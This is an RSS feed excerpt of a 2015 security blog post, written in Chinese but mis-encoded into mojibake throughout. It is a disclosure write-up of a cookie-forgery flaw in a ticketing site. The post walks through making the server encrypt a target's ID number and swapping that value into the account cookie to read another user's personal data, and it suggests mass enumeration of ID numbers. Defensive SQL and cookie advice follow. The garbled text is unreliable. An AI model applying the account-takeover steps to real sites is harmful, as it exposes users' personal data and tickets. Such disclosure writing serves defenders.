&lt;p&gt;æœƒæƒ³è¦èŠé€™å€‹è­°é¡Œï¼Œä¸»è¦æ˜¯å› ç‚ºæœ€è¿‘å¾ˆç´…çš„å®ç¢é›²ç«¯å”®ç¥¨ç³»çµ±å°±æ˜¯æ¡ç”¨ Cookie èªè­‰ã€‚ä¸Šé€±åœ¨è¨»å†Šè©²ç¶²ç«™æ™‚çœ‹äº†ä¸€ä¸‹ Cookieï¼Œç™¼ç¾è©²ç¶²ç«™æ²’æœ‰ä½¿ç”¨ &lt;a href=&quot;https://devco.re/blog/2014/06/03/http-session-protection/&quot;&gt;Session æ©Ÿåˆ¶&lt;/a&gt;çš„è·¡è±¡ï¼Œä¹Ÿå°±æ˜¯å–®ç´”åˆ©ç”¨ Cookie çš„å€¼ä¾†èªè­‰ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/acer_cookie.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/acer_cookie.png&quot; alt=&quot;å®ç¢é›²ç«¯ cookie&quot; title=&quot;å®ç¢é›²ç«¯ cookie&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æ–¼æ˜¯é–‹å§‹å¥½å¥‡èªè­‰ä¸»è¦çš„ä¾æ“šæ˜¯ä»€éº¼ï¼Ÿå¾åœ–ä¸­å¯ä»¥çœ‹åˆ° Cookie å€¼ä¸¦ä¸å¤šï¼ŒçŒœæ¸¬è©²ç¶²ç«™å¤§æ¦‚æœƒæ˜¯çœ‹ USER_IDã€USER_ACCOUNT ä¾†åˆ¤æ–·ä½ æ˜¯å“ªå€‹ä½¿ç”¨è€…ï¼Œç¨ä½œæ¸¬è©¦å¾Œæœƒç™¼ç¾æœ‰äº›é é¢åªä¾æ“š USER_ACCOUNT çš„å€¼ä¾†ç¢ºèªèº«åˆ†ï¼Œè€Œ USER_ACCOUNT é€™å€‹å€¼å…¶å¯¦å°±æ˜¯ä½¿ç”¨è€…çš„èº«åˆ†è­‰å­—è™Ÿï¼Œä¹Ÿå°±æ˜¯èªªä»»ä½•äººåªè¦è·Ÿç¶²ç«™èªªæˆ‘çš„èº«åˆ†è­‰å­—è™Ÿæ˜¯ä»€éº¼ï¼Œç¶²ç«™å°±æœƒèªç‚ºä½ æ˜¯é‚£å€‹èº«åˆ†è­‰å­—è™Ÿçš„ä½¿ç”¨è€…ã€‚åˆ©ç”¨é€™é»è¨­è¨ˆä¸Šçš„å°ç‘•ç–µï¼Œå°±å¯ä»¥ç«Šå–ä»–äººå€‹è³‡ï¼Œæ›´é€²éšä¸€é»ï¼Œç”šè‡³å¯ä»¥ç”¨ä¾†æ¸…ç©ºåˆ¥äººçš„å¿—é¡˜å–®è®“å…¶ä»–ä½¿ç”¨è€…è²·ä¸åˆ°ç¥¨ã€‚&lt;/p&gt;

&lt;p&gt;ç™¼ç¾é€™å€‹å•é¡Œå¾Œï¼Œæ±ºå®šé€šå ± &lt;a href=&quot;https://vulreport.net/&quot;&gt;VulReport æ¼æ´å›å ±å¹³å°&lt;/a&gt;ï¼Œç”±è©²å¹³å°çµ±ä¸€é€šçŸ¥é–‹ç™¼å•†ã€‚é€™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡ä½¿ç”¨é€™å€‹å¹³å°ï¼Œå°æˆ‘è€Œè¨€é€™æ˜¯ä¸€å€‹æ–¹ä¾¿ä¸”å°æ•´é«”è³‡å®‰ç’°å¢ƒæœ‰åŠ©ç›Šçš„å¹³å°ã€‚æ–¹ä¾¿é»åœ¨æ–¼ï¼Œéå»å¸¸å¸¸å›°æ“¾æ–¼ç™¼ç¾ä¸€äº›ç¶²ç«™æœ‰è¨­è¨ˆä¸Šçš„ç–å¤±å»ä¸çŸ¥è©²ä¸è©²é€šå ±ï¼Œå¦‚æœèªè­˜è©²ç¶²ç«™çš„é–‹ç™¼è€…å€’æ˜¯é‚„å¥½å¯ä»¥ç›´æ¥è¬›ï¼Œä½†å°æ–¼å…¶ä»–ä¸èªè­˜çš„ï¼Œä¸€ä¾†æ²’æœ‰æ˜ç¢ºçª—å£ï¼ŒäºŒä¾†ç¤™æ–¼å·¥ä½œé—œä¿‚æ€•è¢«èªç‚ºæ˜¯æ•²ç«¹æ§“ï¼Œæ‰€ä»¥å½±éŸ¿ä¸å¤§çš„æ¼æ´å¯èƒ½å°±æ”¾æ°´æµäº†ã€‚é€™æ¨£æ”¾ä»»å…¶å¯¦ä¸æ˜¯ä¸€ä»¶å¥åº·çš„äº‹æƒ…ï¼Œæ¼æ´åœ¨é¢¨éšªå°±åœ¨ï¼Œæœ‰äº†é€™æ¨£çš„å›å ±å¹³å°è‡³å°‘å¯ä»¥å‘Šè¨´ä¼æ¥­å¯èƒ½å­˜åœ¨é¢¨éšªï¼Œè‡ªå·±ä¹Ÿå¯ä»¥æ”¾å¿ƒé€šå ±ã€‚äº‹å¯¦ä¸Šï¼Œå°å²¸æœ‰&lt;a href=&quot;http://wooyun.org/&quot;&gt;é¡ä¼¼çš„å¹³å°&lt;/a&gt;å·²ç¶“è¡Œä¹‹æœ‰å¹´ï¼Œæœ€é¡¯è‘—çš„æ•ˆæœï¼Œå°±æ˜¯å°å²¸ç¶²ç«™åœ¨ 0 day è¢«æ­éœ²å¾Œèƒ½åœ¨ä¸€é€±å·¦å³å…¨åœ‹ä¿®å¾©ï¼Œè€Œä»¥å¾€å¯èƒ½å¥½å¤šå¹´éå»äº†æ¼æ´é‚„åœ¨ã€‚é€™çœŸçš„èƒ½å¤ åŠ é€Ÿä¿è­·ä¼æ¥­å’Œä½¿ç”¨è€…ï¼Œå¾ˆé«˜èˆˆå°ç£ä¹Ÿæœ‰äº†é€™æ¨£çš„å¹³å°ï¼&lt;/p&gt;

&lt;p&gt;æ˜¨å¤©æ—©ä¸Šæ”¶åˆ°äº†å¹³å°å›å ±å®ç¢é›²ç«¯å”®ç¥¨å·²ç¶“&lt;a href=&quot;https://vulreport.net/vulnerability/detail/284&quot;&gt;ä¿®å¾©çš„æ¶ˆæ¯&lt;/a&gt;ï¼Œæ—¢ç„¶å·²ç¶“ä¿®å¾©ä¸”å…¬é–‹äº†ï¼Œå°±é †ä¾¿è¬›è§£é€™å€‹å•é¡Œçš„ç´°ç¯€å§ï¼å¸Œæœ›å…¶ä»–é–‹ç™¼è€…å¯ä»¥å¾ä¸­é«”æœƒåˆ°æ”»æ“Šè€…çš„æ€ç¶­ï¼Œé€²è€Œåšæ´½ç•¶çš„é˜²ç¦¦ã€‚&lt;/p&gt;

&lt;h3 id=&quot;é©—è­‰åŠå±å®³&quot;&gt;é©—è­‰åŠå±å®³&lt;/h3&gt;

&lt;p&gt;ç‚ºäº†æ–¹ä¾¿é©—è­‰è§£èªªé€™å€‹å•é¡Œï¼Œé€™é‚Šç‰¹åˆ¥ç”¨å…©å€‹ä¸å­˜åœ¨çš„èº«åˆ†è­‰å­—è™Ÿåœ¨å®ç¢é›²ç«¯å”®ç¥¨ç”³è«‹å¸³è™Ÿï¼Œåˆ†åˆ¥æ˜¯ Z288252522 å’Œ Z239398899ã€‚æ¸¬è©¦ç›®çš„æ˜¯ç™»å…¥å¸³è™Ÿ Z288252522 å¾Œçœ‹çœ‹æ˜¯å¦èƒ½åˆ©ç”¨ä¸Šè¿° Cookie å•é¡Œè®€å– Z239398899 çš„å€‹è³‡ã€‚&lt;/p&gt;

&lt;p&gt;é¦–å…ˆç™»å…¥å¸³è™Ÿ Z288252522ï¼Œæ‰¾åˆ°ä¸€å€‹æœƒå›å‚³å€‹è³‡çš„é é¢ï¼š&lt;br /&gt;
https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/user_A_data.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/user_A_data.png&quot; alt=&quot;ç¬¬ä¸€å€‹ä½¿ç”¨è€…å€‹è³‡&quot; title=&quot;ç¬¬ä¸€å€‹ä½¿ç”¨è€…å€‹è³‡&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æ­¤æ™‚çš„ Cookie å€¼å¦‚ä¸‹&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/user_A_cookie.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/user_A_cookie.png&quot; alt=&quot;ç¬¬ä¸€å€‹ä½¿ç”¨è€… cookie&quot; title=&quot;ç¬¬ä¸€å€‹ä½¿ç”¨è€… cookie&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¾åœ–ä¸­ç™¼ç¾ Cookie çš„å€¼å…¶å¯¦æ˜¯ç¶“éåŠ å¯†çš„ï¼Œé€™é»åœ¨ä¸Šé¢èªªæ˜æ”»æ“Šè§€å¿µæ™‚åˆ»æ„æ²’æœ‰æåŠã€‚æŠŠ Cookie å€¼åŠ å¯†æ˜¯ä¸€ç¨®é˜²æ­¢åˆ¥äººä¿®æ”¹ Cookie å€¼çš„æ–¹å¼ï¼Œæ”»æ“Šè€…ä¸çŸ¥é“ Cookie å€¼çš„å…§å®¹ï¼Œè‡ªç„¶ä¹Ÿç„¡æ³•ä¿®æ”¹äº†ã€‚&lt;/p&gt;

&lt;p&gt;ç„¶è€Œé€™æ¨£åšé‚„æ˜¯å­˜åœ¨äº›å¾®é¢¨éšªï¼Œä¸€æ—¦é€™å€‹åŠ è§£å¯†æ–¹å¼è¢«æ‰¾åˆ°ï¼Œæ”»æ“Šè€…å°±å¾—ä»¥ä¿®æ”¹ Cookie å…§å®¹ï¼Œé€²è€Œç›œç”¨åˆ¥äººèº«åˆ†ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œè‹¥æƒ³æ†‘è‘—æ”¹è®Š Cookie ç›œç”¨åˆ¥äººèº«åˆ†å…¶å¯¦å¯ä»¥ä¸ç”¨èŠ±æ™‚é–“å»è§£åŠ å¯†æ³•ï¼Œé€™è£¡æœ‰ä¸€å€‹å° trickï¼Œæˆ‘å€‘å¾è§€å¯Ÿä¸­é¦¬ä¸Šå°±èƒ½ç™¼ç¾æ‰€æœ‰ Cookie å€¼éƒ½æ˜¯ç”¨åŒä¸€å¥—åŠ å¯†æ–¹å¼ï¼Œè€Œä¸”å…¶ä¸­ USER_EMAILã€USER_NAME é€™äº›é‚„æ˜¯æˆ‘å€‘å¯ä»¥ä¿®æ”¹çš„å€¼ã€‚é€™ä¹Ÿæ„å‘³è‘—å¦‚æœæˆ‘å€‘æŠŠå§“åæ”¹æˆæˆ‘å€‘æƒ³è¦åŠ å¯†çš„èº«åˆ†è­‰å­—è™Ÿï¼Œä¼ºæœå™¨å°±æœƒå›å‚³ä¸€å€‹åŠ å¯†å¥½çš„å€¼çµ¦ USER_NAMEã€‚æˆ‘å€‘ç›´æ¥ä¾†ä¿®æ”¹å§“åçœ‹çœ‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;h/assets/img/blog/20150130/change_name.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/change_name.png&quot; alt=&quot;ä¿®æ”¹å§“åæˆèº«åˆ†è­‰å­—è™Ÿ&quot; title=&quot;ä¿®æ”¹å§“åæˆèº«åˆ†è­‰å­—è™Ÿ&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ç•¶å§“åæ”¹æˆç›®æ¨™ Z239398899 æ™‚ï¼ŒCookie ä¸­çš„ USER_NAME å€¼å°±æœƒæ”¹è®Šæˆæˆ‘å€‘è¦çš„åŠ å¯†çµæœã€‚è€¶ï¼æ˜¯ä¸€ç¨®ä½œæ¥­ä¸æœƒå¯«æ‰¾å‡ºé¡Œè€å¸«å¹«å¿™å¯«çš„æ¦‚å¿µ XD&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/user_B_cookie.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/user_B_cookie.png&quot; alt=&quot;æ”¹è®Šç¬¬ä¸€å€‹ä½¿ç”¨è€… cookie&quot; title=&quot;æ”¹è®Šç¬¬ä¸€å€‹ä½¿ç”¨è€… cookie&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æ¥è‘—ç›´æ¥æŠŠ USER_NAME çš„å€¼æ‹¿ä¾†ç”¨ï¼Œè¤‡è£½è²¼ä¸Šåˆ°ç›®æ¨™æ¬„ä½ USER_ACCOUNT ä¸­ï¼Œä¹‹å¾Œå°±æ˜¯ä»¥ Z239398899 çš„èº«åˆ†ä¾†è®€å–ç¶²é äº†ã€‚æˆ‘å€‘å†è®€å–ä¸€æ¬¡ https://www.jody-ticket.com.tw/UTK0196_.aspx çœ‹çœ‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/user_B_data.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/user_B_data.png&quot; alt=&quot;ç¬¬äºŒå€‹ä½¿ç”¨è€…å€‹è³‡&quot; title=&quot;ç¬¬äºŒå€‹ä½¿ç”¨è€…å€‹è³‡&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æˆåŠŸçœ‹åˆ° Z239398899 çš„è³‡æ–™äº†ï¼å¦‚æ­¤ï¼Œå°±å¯ä»¥åªæ†‘ä¸€å€‹èº«åˆ†è­‰å­—è™Ÿè®€åˆ°ä»–äººçš„åœ°å€é›»è©±è³‡è¨Šï¼Œç”šè‡³å¯ä»¥å¹«åˆ¥äººæ¶ç¥¨æˆ–å–æ¶ˆç¥¨åˆ¸ã€‚é€™å€‹æµç¨‹å¯«æˆç¨‹å¼å¾Œåªè¦å…©å€‹ request å°±å¯ä»¥å˜—è©¦ç™»å…¥ä¸€å€‹èº«åˆ†è­‰å­—è™Ÿï¼Œè¦å¤§é‡å·å–æœƒå“¡å€‹è³‡ä¹Ÿæ˜¯å¯è¡Œçš„äº†ã€‚&lt;/p&gt;

&lt;p&gt;èªªåˆ°é€™é‚Šï¼Œä¹Ÿè¨±æœ‰äººæœƒè³ªç–‘è¦çŒœä¸­è¨»å†Šå¸³æˆ¶çš„èº«åˆ†è­‰å­—è™Ÿæ˜¯æœ‰é›£åº¦çš„ï¼Œä½†å…¶å¯¦è¦åˆ—èˆ‰å‡ºå…¨å°ç£å¯èƒ½åœ¨ä½¿ç”¨çš„èº«åˆ†è­‰å­—è™Ÿä¸¦ä¸å›°é›£ï¼Œå†åŠ ä¸Šå®ç¢é›²ç«¯çš„ç¡¬é«”å…¶å¯¦æ˜¯å¾ˆä¸éŒ¯çš„ï¼Œäº‹å¯¦ä¹Ÿè­‰æ˜å®ƒèƒ½å¤ åœ¨&lt;a href=&quot;https://tw.news.yahoo.com/%E6%B1%9F%E8%95%99%E5%8A%A0%E5%A0%B4%E5%94%AE%E7%A5%A8-%E9%A7%AD%E5%AE%A2%E6%94%BB%E6%93%8A4000%E8%90%AC%E6%AC%A1-041458504.html&quot;&gt;çŸ­æ™‚é–“è™•ç†å››åƒè¬å€‹è«‹æ±‚ç³»çµ±ä»ä¿æŒç©©å®š&lt;/a&gt;ï¼Œåªè¦æ”»æ“Šè€…ç¶²è·¯ä¸è¦&lt;a href=&quot;http://www.cna.com.tw/news/afe/201501250162-1.aspx&quot;&gt;å¡åœ¨è‡ªå®¶å··å­å£&lt;/a&gt;ï¼Œå¤šæ©Ÿå™¨å¤šç·šç¨‹ä½ˆä¸‹å»çŒœèº«åˆ†è­‰å­—è™Ÿæ•ˆç‡æ‡‰è©²å¾ˆå¯è§€ï¼&lt;/p&gt;

&lt;h3 id=&quot;å»ºè­°åŸå‰‡&quot;&gt;å»ºè­°åŸå‰‡&lt;/h3&gt;

&lt;p&gt;é€™æ¬¡çš„å•é¡Œæ˜¯å…©å€‹å¼±é»çš„çµ„åˆæ”»æ“Šï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Cookie åŠ å¯†çš„å…§å®¹å¯è§£ä¹Ÿå¯å½é€ ï¼é€éç¶²ç«™å¹«å¿™&lt;/li&gt;
  &lt;li&gt;åŠŸèƒ½ç¼ºå°‘æ¬Šé™æ§ç®¡ (Missing Function Level Access Control)ï¼éƒ¨åˆ†é é¢åªæ†‘èº«åˆ†è­‰å­—è™Ÿå°±å¯å­˜å–å€‹è³‡&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;å®ç¢é›²ç«¯å”®ç¥¨ç‚ºäº†æ•ˆç‡å’Œåˆ†æµï¼Œä½¿ç”¨ Cookie èªè­‰æ˜¯ç›¸ç•¶åˆç†çš„è¨­è¨ˆï¼Œæ‰€ä»¥è¦è§£æ±ºé€™å€‹å•é¡Œï¼Œå¾ç¬¬äºŒé»ä¾†è§£æ±ºæœƒæ˜¯æœ€æœ‰æ•ˆä¸”ç¬¦åˆæˆæœ¬çš„æ–¹å¼ï¼Œæ€éº¼æ”¹å‘¢ï¼Ÿæ¨æ¸¬åŸæœ¬çš„ SQL èªå¥æ‡‰è©²é¡ä¼¼é€™æ¨£ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;USER&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;account&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;USER_ACCOUNT&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ç”±æ–¼ USER_ACCOUNT æ˜¯èº«åˆ†è­‰å­—è™Ÿï¼Œå®¹æ˜“çª®èˆ‰ï¼Œæ›´åš´è¬¹çš„ä½œæ³•å¯ä»¥å¤šåˆ¤æ–·ä¸€å€‹ idï¼Œåƒæ˜¯é€™æ¨£ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;USER&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;account&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;USER_ACCOUNT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;USER_ID&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;å¾åªéœ€è¦å‘Šè¨´ä¼ºæœå™¨èº«åˆ†è­‰å­—è™Ÿå°±å›å‚³æœƒå“¡è³‡æ–™ï¼Œåˆ°è®Šæˆéœ€è¦èº«åˆ†è­‰å­—è™Ÿå’Œæœƒå“¡ç·¨è™ŸåŒæ™‚æ­£ç¢ºæ‰æœƒå›å‚³æœƒå“¡è³‡æ–™ï¼Œè‡³æ­¤ï¼Œæ”»æ“Šè€…å·²ç¶“å¾ˆé›£åŒæ™‚çŸ¥é“åˆ¥äººçš„æœƒå“¡ç·¨è™Ÿå’Œèº«åˆ†è­‰å­—è™Ÿäº†ï¼Œå› æ­¤å¤§å¤§é™ä½äº†è¢«çŒœä¸­çš„æ©Ÿç‡ï¼Œå¢åŠ äº†å®‰å…¨æ€§ã€‚&lt;/p&gt;

&lt;p&gt;Cookie ä¸€ç›´ä»¥ä¾†éƒ½æ˜¯ Web Application Security é ˜åŸŸçš„å…µå®¶å¿…çˆ­ä¹‹åœ°ï¼Œæ”»æ“Šè€…ç„¡ä¸çµç›¡è…¦æ±æƒ³å·åˆ°æˆ–å½é€ å®ƒï¼Œå‰é™£å­èˆ‰è¾¦çš„ &lt;a href=&quot;http://girls.hitcon.org/&quot;&gt;HITCON GIRLS&lt;/a&gt; Web èª²å ‚ç·´ç¿’é¡Œç¬¬ä¸€é¡Œå°±æ˜¯æ”¹ Cookie ä¾†å½é€ èº«åˆ†ï¼Œè¶³è¦‹é€™å€‹å•é¡Œæœ‰å¤šåŸºæœ¬å’Œé‡è¦ã€‚&lt;/p&gt;

&lt;p&gt;é—œæ–¼ Cookieï¼Œé€™è£¡æä¾›ä¸€é»åŸå‰‡å’Œæ¦‚å¿µä¾›å¤§å®¶åƒè€ƒï¼š&lt;/p&gt;

&lt;p&gt;é¦–å…ˆï¼ŒCookie æ˜¯å­˜åœ¨å®¢æˆ¶ç«¯çš„ï¼Œæ‰€ä»¥æœ‰æ©Ÿæœƒè¢«çœ‹åˆ°ã€è¢«ç«„æ”¹ã€è¢«å…¶ä»–äººå·èµ°ã€‚åŸºæ–¼é€™äº›åŸå› ï¼Œä¸å»ºè­°åœ¨ Cookie ä¸­å„²å­˜æ©Ÿæ•è³‡æ–™ï¼Œæˆ–æ˜¯å­˜æ”¾æœƒå½±éŸ¿ä¼ºæœå™¨é‹ä½œçš„é‡è¦åƒæ•¸ï¼Œéœ€è©•ä¼°ä¸€ä¸‹é€™äº›æš«å­˜è³‡æ–™è¢«äººå®¶çœ‹åˆ°æˆ–ä¿®æ”¹æ˜¯ä¸æ˜¯æ²’å·®ï¼Œé€™æ˜¯å„²å­˜çš„åŸå‰‡ã€‚å¦‚æœæ¬Šè¡¡å¾Œé‚„æ˜¯è¦åœ¨ Cookie ä¸­å­˜æ”¾é‡è¦è³‡æ–™ï¼Œé‚£å°±éœ€è¦å°å€¼åŠ å¯†é¿å…è¢«è®€æ”¹ï¼Œè€Œä¸”è¦ç¢ºä¿åŠ å¯†çš„å¼·åº¦ä»¥åŠå…¶ä»–äººæ˜¯å¦èƒ½é€éå…¶ä»–æ–¹æ³•è§£æä¿®æ”¹ã€‚æœ€å¾Œï¼ŒCookie æœ€å¸¸è¢«å·èµ°çš„æ–¹å¼æ˜¯é€é JavaScriptï¼Œæ‰€ä»¥å»ºè­°åœ¨é‡è¦çš„ Cookie åŠ ä¸Š &lt;a href=&quot;https://devco.re/blog/2014/06/11/setcookie-httponly-security-issues-of-http-headers-3/&quot;&gt;HttpOnly flag&lt;/a&gt; èƒ½æœ‰æ•ˆçš„é™ä½è¢«å·èµ°çš„æ©Ÿç‡ã€‚ä¹Ÿä¾†è©¦è‘—æ•´ç†ä¸€ä¸‹é€™ä¸€å°æ®µçš„é‡é»ï¼š&lt;/p&gt;

&lt;ul class=&quot;devcore&quot;&gt;
  &lt;li&gt;æ©Ÿæ•è³‡æ–™ä¸è¦å­˜&lt;/li&gt;
  &lt;li&gt;åŠ å¯†è³‡è¨Šä¸å¯å°‘&lt;/li&gt;
  &lt;li&gt;è¨­å®šæ¨™é ­ä¸æ€•é§­&lt;/li&gt;
  &lt;li&gt;ä¸€æ¬¡æå®šæ²’ç…©æƒ±&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æ²’æƒ³åˆ°ä¿¡æ‰‹æ‹ˆä¾†å°±æ˜¯ä¸‰ä¸ä¸€æ²’æœ‰ï¼Œå‰é¢å†åŠ å€‹å‹¾å‹¾ï¼Œæ„Ÿè¦ºå¥½åƒå¾ˆå²å®³å‘¢ï¼&lt;/p&gt;

&lt;h3 id=&quot;çµè«–&quot;&gt;çµè«–&lt;/h3&gt;

&lt;p&gt;ç”±æ–¼ Cookie å­˜åœ¨ç€è¦½å™¨ç«¯ï¼Œæœ‰è¢«ç«„æ”¹çš„å¯èƒ½ï¼Œæ‰€ä»¥å¦‚æœç¶²ç«™ä½¿ç”¨ Cookie èªè­‰å°±æœƒæœ‰ä¸€äº›å®‰å…¨ä¸Šçš„é¢¨éšªã€‚æœ¬ç¯‡å°±ä»¥å®ç¢é›²ç«¯å”®ç¥¨ç‚ºä¾‹ï¼Œèªªæ˜é€™ç¨®å°ç–å¿½å¯èƒ½æœƒé€ æˆè¢«ç›œç”¨å¸³è™Ÿçš„é¢¨éšªã€‚é–‹ç™¼è€…åœ¨é¢å°ä½¿ç”¨è€…å¯ä»¥æ”¹è®Šçš„è®Šæ•¸ä¸€å®šè¦ç‰¹åˆ¥å°å¿ƒè™•ç†ï¼Œåšå¥½è©²æœ‰çš„é˜²è­·ï¼Œé‚„æ˜¯è€è©±ä¸€å¥ï¼šä½¿ç”¨è€…å‚³ä¾†çš„è³‡æ–™çš†ä¸å¯ä¿¡ï¼åªè¦æŒæ¡é€™å€‹åŸå‰‡ï¼Œé–‹ç™¼å‡ºä¾†çš„ç”¢å“å°±èƒ½å¤ å°‘å¾ˆå¤šå¾ˆå¤šé¢¨éšªï¼&lt;/p&gt;

&lt;p&gt;è¡Œæ–‡è‡³æ­¤ï¼Œé æœŸä¸­æ˜¯è¦å†æ¨å»£ä¸€ä¸‹æ¼æ´å›å ±å¹³å°ï¼Œé †ä¾¿ç¨±è®šå®ç¢éå¸¸é‡è¦–è³‡å®‰ï¼Œä¿®å¾©å¿«é€Ÿï¼Œæ˜¯è‰¯å¥½çš„æ­£å¾ªç’°ã€‚ä¸éå‰å…©å¤©çœ‹åˆ°ä¸€äº›é—œæ–¼å®ç¢é›²ç«¯å”®ç¥¨çš„æ–°èæ™‚ï¼Œä¸Šç·šç™¼ç¾æ­¤å¼±é»ä»æœªä¿®å¾©ï¼Œé€™å¥½åƒçœŸçš„æœ‰é»ä¸æ‡‰è©²ï¼Œç•¢ç«Ÿå®˜æ–¹ä¸Šé€±å·²ç¶“æ¥æ”¶åˆ°é€šå ±ï¼Œè¦ä¿®å¾©é€™å€‹å¼±é»ä¹Ÿåªéœ€ä¸€è¡Œåˆ¤æ–·å¼â€¦ã€‚èƒ½ç†è§£é€™æ¬¡çš„å¼±é»åœ¨çŸ­æ™‚é–“é–‹ç™¼éç¨‹ä¸­å¾ˆé›£è¢«æ³¨æ„åˆ°ï¼Œå°æ–¼é€™æ¨£ä¸€å€‹ä¸€é€±ä¸çœ ä¸ä¼‘å®Œæˆçš„å”®ç¥¨ç¶²ç«™ï¼Œæˆ‘å…¶å¯¦ä¹Ÿæ˜¯çµ¦äºˆæ»¿é«˜çš„è©•åƒ¹ï¼Œä½†å¦‚æœå®˜æ–¹èƒ½å†å¢å…©åˆ†å°è³‡å®‰äº‹ä»¶çš„é‡è¦–ï¼Œç›¸ä¿¡ä¸‹æ¬¡å®šèƒ½ä»¥æ»¿åˆ†ä¹‹å§¿å‘ˆç¾åœ¨ä½¿ç”¨è€…é¢å‰ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2015/01/30/cookie-security-insight-acer/</link>
                <guid>https://devco.re/blog/2015/01/30/cookie-security-insight-acer</guid>
                <pubDate>Fri, 30 Jan 2015 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>å¾å¯¬å®å”®ç¥¨è«‡è³‡å®‰</title>
                <description>&lt;p&gt;æˆ´å¤«å¯‡çˆ¾éƒ¨è½æ ¼åœè¼‰äº†å¿«å…©å€‹æœˆï¼Œéå¸¸æŠ±æ­‰ï¼Œè®“å„ä½å¸¸å¸¸å‚¬ç¨¿çš„æœ‹å‹å€‘ä¹…ç­‰äº† &amp;lt;(_ _)&amp;gt;&lt;br /&gt;
ä»Šå¤©å°±ä¹˜è‘—å…¨è‡ºç˜‹è²·ç¥¨çš„æµªé ­ï¼Œä¾†è«‡è«‡ä¸€äº›å¸¸è¢«å¿½ç•¥çš„è³‡è¨Šå®‰å…¨å°æ¦‚å¿µå§ï¼&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;æ±Ÿè•™å¼•é€€æ¼”å”±æœƒä¸€ç¥¨é›£æ±‚ï¼Œéš”å²¸è§€äº†å…©å¤©ç«ï¼Œ ä¹Ÿå¿ä¸ä½æƒ³è¦ç•¶å€‹éµç›¤å­å­ã€‚ç„¡å¥ˆé‹æ°£ä¸å¥½ä¸€ç›´é€£ä¸ä¸Šä¸»æ©Ÿï¼Œã€Service Unavailableã€ç•«é¢çœ‹è†©äº†ï¼Œåªå¥½çœ‹çœ‹æš«å­˜é é¢çš„ç¶²é åŸå§‹ç¢¼ï¼Œä¸çœ‹é‚„å¥½ï¼Œä¸€çœ‹æˆ‘é©šå‘†äº†ï¼&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150109/kham_information_leakage.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150109/kham_information_leakage.png&quot; alt=&quot;å¯¬å®å”®ç¥¨è³‡è¨Šæ´©æ¼&quot; title=&quot;å¯¬å®å”®ç¥¨è³‡è¨Šæ´©æ¼&quot; /&gt;&lt;/a&gt;
ï¼ˆç‰¹åˆ¥è²æ˜ï¼šæ­¤æµç¨‹ä¸­ä¸¦ç„¡ä»»ä½•æ”»æ“Šè¡Œç‚ºï¼Œè©²é é¢æ˜¯æ­£å¸¸è³¼ç¥¨æµç¨‹ä¸­å‡ºç¾çš„ç¶²é ï¼‰&lt;/p&gt;

